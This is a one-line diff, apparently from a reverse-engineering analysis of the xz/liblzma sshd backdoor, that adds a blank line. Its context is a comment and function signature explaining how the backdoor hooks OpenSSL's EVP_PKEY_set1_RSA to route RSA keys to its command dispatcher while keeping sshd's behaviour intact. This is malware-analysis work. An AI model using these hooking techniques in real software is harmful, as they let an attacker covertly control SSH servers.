@@ -7,6 +7,7 @@
 /*
  * AutoDoc: Shims EVP_PKEY_set1_RSA so the dispatcher inspects every RSA handle even if RSA_public_decrypt never fires. It validates the preserved OpenSSL pointer, hands the key to run_backdoor_commands with a stack do_orig flag, and always tail-calls the genuine EVP_PKEY_set1_RSA so sshd's key bookkeeping stays intact.
  */
+
 #include "xzre_types.h"
 
 int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)
